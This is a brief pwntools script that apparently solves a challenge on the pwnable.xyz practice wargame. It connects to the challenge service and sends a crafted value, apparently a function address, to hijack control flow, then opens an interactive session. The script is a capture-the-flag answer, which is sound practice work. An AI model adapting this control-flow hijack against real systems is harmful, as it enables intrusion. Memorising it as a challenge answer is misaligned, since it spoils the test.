#!/usr/bin/python 
from pwn import *

p = remote("svc.pwnable.xyz", 30002)

p.sendlineafter("Input: ", "4196386 0 13")
p.sendlineafter("Input: ", "a a a")

p.interactive()
